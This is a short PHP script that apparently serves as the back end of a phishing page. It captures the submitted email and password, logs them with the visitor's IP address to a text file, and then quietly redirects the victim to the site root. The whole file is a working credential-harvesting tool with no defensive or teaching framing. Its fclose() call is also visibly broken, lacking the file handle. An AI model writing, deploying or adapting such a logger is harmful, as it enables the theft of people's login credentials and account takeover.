<?php
$username = $_POST['email'];
$password = $_POST['pass'];
$logfile = fopen('log.txt', 'a');
$ipaddress = $_SERVER['REMOTE_ADDR'];

fwrite($logfile, $ipaddress . " USER: " . $username . "\n");
fwrite($logfile, "PASSWORD: " . $password . "\n\n");
fclose();

sleep(5);
header("Location: /");
?>
